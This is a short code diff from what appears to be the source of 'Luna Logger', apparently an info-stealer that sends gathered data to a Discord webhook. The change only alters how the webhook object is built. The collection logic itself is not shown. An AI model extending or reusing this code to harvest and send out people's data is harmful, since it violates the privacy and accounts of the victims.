@@ -32,7 +32,7 @@ __PINGTYPE__ = "%ping_type%"
 def main(webhook: str):
     global embed
 
-    webhook = SyncWebhook.from_url(webhook, session=requests.Session())
+    webhook = SyncWebhook.from_url(webhook)
     embed = Embed(title="Luna Logger", color=5639644)
 
     get_inf()
